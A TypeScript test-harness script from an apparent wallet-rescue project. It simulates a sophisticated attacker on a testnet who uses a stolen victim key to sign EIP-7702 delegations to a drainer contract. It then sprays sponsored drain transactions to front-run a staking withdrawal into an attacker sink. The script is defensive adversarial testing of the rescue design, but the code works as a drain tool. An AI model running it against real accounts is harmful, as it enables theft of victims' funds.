/**
 * The mirror-design atomic attacker — the last and hardest test. TEST HARNESS ONLY.
 *
 * Every prior atomic run beat the attacker by starving its nonce: it sent the drain FROM the
 * victim account, so its transaction competed with our authorizations for the victim's nonce and
 * lost. A sophisticated attacker does not make that mistake. It mirrors our own rescue design
 * exactly:
 *
 *   - a SPONSOR account (their guardian) sends every drain, so the transaction consumes the
 *     SPONSOR's nonce, not the victim's — immune to our nonce bumping;
 *   - a MARCHING window of victim->drainer authorizations (their window.json), signed across a
 *     nonce range, so whatever the victim's nonce is when a drain lands, a valid authorization is
 *     carried to re-delegate the victim to the drainer;
 *   - a pre-queued spray, one drain per block across the flip window, so one is in a leader's
 *     mempool when the flip block is built.
 *
 * This is the true worst case. Against it we hold no structural edge: both sides sponsor, both
 * march authorizations, both consume the victim's nonce, and the flip-block auction comes down to
 * ordering and fee. At an equal fee it is close to a coin flip, and the result — win OR lose —
 * is what bounds the honest product claim.
 *
 * The attacker holds the victim seed (that is the whole threat model), so it can sign the
 * victim->drainer authorizations itself. Throwaway testnet accounts only.
 *
 *   ATTACKER_SPONSOR_KEY  a funded second key (the attacker's guardian) — fund it for gas.
 *   ADVERSARY_DRAINER     the deployed drainer.
 *   MIRROR_TIP_GWEI       equal-fee tip (use arm's window tip).
 */
for (const p of ['../../.env', '../.env', '.env']) {
  try { process.loadEnvFile(new URL(p, import.meta.url).pathname); } catch { /* absent */ }
}
import { createWalletClient, http, formatEther, getAddress, encodeFunctionData, parseGwei, createPublicClient } from 'viem';
import type { SignedAuthorization } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import {
  chainById, RPC_POOL, publicClientFor, getEpoch, getWithdrawalRequest, isClaimable,
  maturityEpoch, sprayStartBlockFor, latestStartBlockFor,
} from '@monrescue/shared';
import { requireEnv, writeArtifact } from './lib.js';

const CHAIN_ID = Number(process.env.CHAIN_ID ?? 10143);
const AUTHS_PER_ATTEMPT = Number(process.env.MIRROR_AUTHS_PER_ATTEMPT ?? 4); // chain cap
const MIN_POLL_MS = Number(process.env.MIRROR_POLL_MS ?? 300);
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

const DRAIN_ABI = [{
  type: 'function', name: 'drain', stateMutability: 'nonpayable',
  inputs: [{ name: 'validatorIds', type: 'uint64[]' }, { name: 'withdrawIds', type: 'uint8[]' }], outputs: [],
}] as const;

async function broadcastAll(chainId: number, raw: `0x${string}`, urls: readonly string[]) {
  const chain = chainById(chainId);
  const sends = urls.map(async (url) => {
    const c = createPublicClient({ chain, transport: http(url, { retryCount: 0 }) });
    return c.sendRawTransaction({ serializedTransaction: raw });
  });
  try { return await Promise.any(sends); } catch { return undefined; }
}

async function main() {
  const victim = privateKeyToAccount(requireEnv('RESEARCH_PRIVATE_KEY') as `0x${string}`);
  const sponsor = privateKeyToAccount(requireEnv('ATTACKER_SPONSOR_KEY') as `0x${string}`);
  const drainer = getAddress(requireEnv('ADVERSARY_DRAINER'));
  const sink = getAddress(requireEnv('ATTACKER_SINK'));
  const validatorId = BigInt(requireEnv('VALIDATOR_ID'));
  const withdrawId = Number(process.env.WITHDRAW_ID ?? 0);
  const chain = chainById(CHAIN_ID);
  const urls = RPC_POOL[CHAIN_ID]!;
  const client = publicClientFor(CHAIN_ID, urls[0]!);
  const victimWallet = createWalletClient({ account: victim, chain, transport: http(urls[0]!) });
  const sponsorWallet = createWalletClient({ account: sponsor, chain, transport: http(urls[0]!) });

  const req = await getWithdrawalRequest(client, validatorId, victim.address, withdrawId);
  if (req.withdrawalAmount === 0n) throw new Error('no pending withdrawal to drain');
  const activationEpoch = req.withdrawEpoch;
  const targetEpoch = maturityEpoch(activationEpoch);
  const sprayStart = sprayStartBlockFor(targetEpoch);
  const latestStart = latestStartBlockFor(targetEpoch);

  const sponsorBal = await client.getBalance({ address: sponsor.address });
  console.log(`=== mirror-atomic attacker (sponsored + marching) ===`);
  console.log(`victim:   ${victim.address}`);
  console.log(`sponsor:  ${sponsor.address} (${formatEther(sponsorBal)} MON for gas)`);
  console.log(`drainer:  ${drainer}  ->  sink ${sink}`);
  console.log(`racing for ${formatEther(req.withdrawalAmount)} MON, claimable epoch ${targetEpoch}`);
  console.log(`flip window ${sprayStart}..${latestStart}`);
  if (sponsorBal === 0n) throw new Error('sponsor has no gas — fund ATTACKER_SPONSOR_KEY');

  // Equal-fee bid. To make it truly equal without hand-copying a number from arm, compute the
  // tip the SAME way arm's window does — p90 of recently-observed priority fees times 15 — rather
  // than requiring MIRROR_TIP_GWEI. Set MIRROR_TIP_GWEI to override.
  let maxPriorityFeePerGas: bigint;
  if (process.env.MIRROR_TIP_GWEI) {
    maxPriorityFeePerGas = parseGwei(process.env.MIRROR_TIP_GWEI);
    console.log(`bid: ${process.env.MIRROR_TIP_GWEI} gwei tip (explicit override)`);
  } else {
    const head = await client.getBlockNumber();
    const tips: bigint[] = [];
    for (let i = 0; i < 5; i++) {
      try {
        const blk = await client.getBlock({ blockNumber: head - BigInt(i), includeTransactions: true });
        for (const tx of blk.transactions) if (typeof tx !== 'string' && tx.maxPriorityFeePerGas != null) tips.push(tx.maxPriorityFeePerGas);
      } catch { /* skip */ }
    }
    tips.sort((a, b) => (a < b ? -1 : a > b ? 1 : 0));
    const p90 = tips.length ? tips[Math.min(tips.length - 1, Math.floor(0.9 * tips.length))]! : parseGwei('2');
    maxPriorityFeePerGas = (p90 > 0n ? p90 : parseGwei('2')) * 15n; // arm's WINDOW_FEE_OVERTOP
    console.log(`bid: ${maxPriorityFeePerGas / 1_000_000_000n} gwei tip (p90 x15 of ${tips.length} txs — matches arm's window)`);
  }
  const maxFeePerGas = parseGwei('300') + maxPriorityFeePerGas;

  // --- marching victim->drainer authorization window (their window.json) ----
  // Signed by the victim key at the victim's current nonces, NO +1 and NO executor:'self',
  // because these are sponsor-submitted (relayer) — the authority nonce is validated directly,
  // exactly as make-window signs ours. One authorization per victim nonce across the window.
  const victimNonce = await client.getTransactionCount({ address: victim.address });
  const windowBlocks = Number(latestStart - sprayStart);
  const attemptCount = Math.max(1, windowBlocks + 2);
  const windowSize = attemptCount + AUTHS_PER_ATTEMPT + 2;
  console.log(`\nsigning ${windowSize} victim->drainer authorizations from nonce ${victimNonce}...`);
  const authWindow: SignedAuthorization[] = [];
  for (let i = 0; i < windowSize; i++) {
    authWindow.push(await victimWallet.signAuthorization({
      account: victim, contractAddress: drainer, chainId: CHAIN_ID, nonce: victimNonce + i,
    }));
  }
  const authsFor = (i: number): SignedAuthorization[] =>
    authWindow.filter((a) => (a.nonce as number) >= victimNonce + i).slice(0, AUTHS_PER_ATTEMPT);

  // --- pre-sign sponsored drains at the sponsor's consecutive nonces --------
  const drainData = encodeFunctionData({ abi: DRAIN_ABI, functionName: 'drain', args: [[validatorId], [withdrawId]] });
  const sponsorBase = await client.getTransactionCount({ address: sponsor.address });
  const gas = 400_000n + 25_000n * BigInt(AUTHS_PER_ATTEMPT); // drain + auth intrinsic
  console.log(`pre-signing ${attemptCount} sponsored drains from sponsor nonce ${sponsorBase}, ${AUTHS_PER_ATTEMPT} auth each...`);
  const attempts: `0x${string}`[] = [];
  for (let i = 0; i < attemptCount; i++) {
    attempts.push(await sponsorWallet.signTransaction({
      to: victim.address, data: drainData, nonce: sponsorBase + i, gas,
      maxFeePerGas, maxPriorityFeePerGas, chain, authorizationList: authsFor(i),
    } as never));
  }
  console.log(`ranges marching ${victimNonce}..${victimNonce + attemptCount - 1} across the spray`);

  const sinkBaseline = await client.getBalance({ address: sink });
  console.log(`\nwaiting for the flip window...`);

  // --- spray loop (guarded, poll slow then fast) ----------------------------
  let sprayed = 0, lastLog = 0n;
  for (;;) {
    let block: bigint, epoch: Awaited<ReturnType<typeof getEpoch>>;
    try { block = await client.getBlockNumber(); epoch = await getEpoch(client); }
    catch { await sleep(500); continue; }

    if (block >= sprayStart && sprayed < attempts.length) {
      const raw = attempts[sprayed]!; sprayed++;
      broadcastAll(CHAIN_ID, raw, urls)
        .then((h) => console.log(`  drain #${sprayed} sponsor-nonce=${sponsorBase + sprayed - 1} ${h ?? 'REJECTED'}`))
        .catch(() => {});
      await sleep(Math.round(0.301 * 1000));
      continue;
    }

    if (isClaimable(epoch, activationEpoch) && sprayed >= attempts.length) {
      // window exhausted; keep firing fresh sponsored drains at the current sponsor nonce
      const n = await client.getTransactionCount({ address: sponsor.address });
      const raw = await sponsorWallet.signTransaction({
        to: victim.address, data: drainData, nonce: n, gas, maxFeePerGas, maxPriorityFeePerGas, chain,
        authorizationList: authsFor(0),
      } as never);
      const h = await broadcastAll(CHAIN_ID, raw, urls);
      console.log(`  fallback drain sponsor-nonce=${n} ${h ?? 'REJECTED'}`);
    }

    if (epoch.epoch > targetEpoch || block > latestStart + 200n) break;
    if (block < sprayStart - 200n) {
      if (block - lastLog >= 2000n) { console.log(`[idle] ${sprayStart - block} blocks to the flip window`); lastLog = block; }
      await sleep(15_000);
    } else {
      await sleep(MIN_POLL_MS);
    }
  }

  const sinkFinal = await client.getBalance({ address: sink });
  const took = sinkFinal - sinkBaseline;
  const victimCode = await client.getCode({ address: victim.address });
  console.log(`\n=== mirror-atomic done ===`);
  console.log(`attacker took: ${formatEther(took)} MON (sink ${formatEther(sinkBaseline)} -> ${formatEther(sinkFinal)})`);
  console.log(`victim delegated to: ${victimCode && victimCode.length === 48 ? '0x' + victimCode.slice(8) : 'none'}`);
  console.log(took > 0n ? '\nATTACKER WON this run — the mirror-design atomic attacker took the position.'
    : '\nattacker took nothing this run — check the safe address for our result.');
  await writeArtifact('battle-mirror-atomic', {
    sponsor: sponsor.address, drainer, attemptsSprayed: sprayed,
    sinkBaseline: sinkBaseline.toString(), sinkFinal: sinkFinal.toString(), attackerTook: took.toString(),
    victimDelegatedAfter: victimCode,
  });
  process.exit(0);
}

main().catch((e) => { console.error(`\nmirror-atomic failed: ${e.message}`); process.exit(1); });
